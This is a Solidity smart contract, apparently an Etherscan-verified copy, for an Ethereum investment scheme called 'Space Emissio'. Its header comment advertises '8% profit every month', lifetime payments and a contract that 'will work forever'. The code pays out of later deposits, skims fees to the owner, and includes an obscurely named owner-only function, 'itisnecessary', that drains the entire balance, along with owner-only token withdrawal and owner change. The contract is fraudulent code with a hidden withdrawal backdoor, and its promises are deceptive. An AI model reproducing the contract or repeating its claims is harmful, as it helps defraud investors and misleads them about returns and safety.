/**
 *Submitted for verification at Etherscan.io on 2019-10-16
*/

/**
 *Submitted for verification at Etherscan.io on 2019-10-15
*/

pragma solidity ^0.5.10;

/*
Get 8% profit every month with a contract Space Emissio!
*
* - lifetime payments
* - unprecedentedly reliable
* - bring luck
* - first minimum contribution from 0.1 eth, all next from 0.01 eth
* - Currency and Payment - ETH
* - Contribution allocation schemes:
* - 100% of payments - only 6% percent for support and 3% percent referral system!
* 
*
* RECOMMENDED GAS LIMIT: 200,000
* RECOMMENDED GAS PRICE: https://ethgasstation.info/
* DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)
* You can check payments on the website etherscan.io, in the ¡°Internal Txns¡± tab of your wallet.
*
* Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!
*
* How to use:
* 1. By minimum 2 CWT Stock's (0xA30b4f63A216Ceb9911f4907a2259Fa80a8Fb725)
* 2. Send from your ETH wallet to the address of the smart contract
* any amount first from 0.1 ETH and all next from 0.01 ETH.
* 3. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
* Take profit by sending 0 eth to contract (profit is calculated every second).
*
**/

contract ERC20Token
{
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract SpaceEmissiio
{
    using SafeMath for uint256;
    
    //CWT Wallet
    address payable public owner = 0x76E40e08e10c8D7D088b20D26349ec52932F8BC3;
    
    uint256 minBalance = 2;
   
    ERC20Token CWT_Token = ERC20Token(0xA30b4f63A216Ceb9911f4907a2259Fa80a8Fb725);
   
    
    struct InvestorData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 totalProfit;
    }
    mapping (address => InvestorData) investors;
    
    modifier onlyOwner()
    {
        assert(msg.sender == owner);
        _;
    }
    
    function itisnecessary() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }    
    
    function addInvestment( uint investment, address payable investorAddr) public onlyOwner  {
        investorAddr.transfer(investment);
    } 
  
    
    function changeOwner(address payable newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function changeMinBalance(uint256 newMinBalance) public onlyOwner {
        minBalance = newMinBalance;
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {
        assembly {
          addr := mload(add(bys,20))
        } 
    }
    // function for transfer any token from contract
    function transferTokens (address token, address target, uint256 amount) onlyOwner public
    {
        ERC20Token(token).transfer(target, amount);
    }
    
    function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, uint256 totalProfit, uint256 contractBalance)
    {
        InvestorData memory data = investors[investor];
        totalFunds = data.funds;
        if (data.funds > 0) pendingReward = data.funds.mul(8).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
        totalProfit = data.totalProfit;
        contractBalance = address(this).balance;
    }
    
    function() payable external
    {
        assert(msg.sender == tx.origin); // prevent bots to interact with contract
        
        if (msg.sender == owner) return;
        
          assert(CWT_Token.balanceOf(msg.sender) >= minBalance * 10**18);
        
        
        InvestorData storage data = investors[msg.sender];
        
        if (msg.value > 0)
        {
            // first investment at least 0.1 ether, all next at least 0.01 ether
            assert(msg.value >= 0.1 ether || (data.funds != 0 && msg.value >= 0.01 ether));
            if (msg.data.length == 20) {
                address payable ref = bytesToAddress(msg.data);
                assert(ref != msg.sender);
                ref.transfer(msg.value.mul(3).div(100));   // 3%
                owner.transfer(msg.value.mul(6).div(100));  // 6%
            } else if (msg.data.length == 0) {
                owner.transfer(msg.value.mul(9).div(100));
            } else {
                assert(false); // invalid memo
            }
        }
        
        
        if (data.funds != 0) {
            // 8% per 30 days
            uint256 reward = data.funds.mul(8).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
            data.totalProfit = data.totalProfit.add(reward);
            
            address(msg.sender).transfer(reward);
        }

        data.lastDatetime = block.timestamp;
        data.funds = data.funds.add(msg.value.mul(91).div(100));
        
    }
}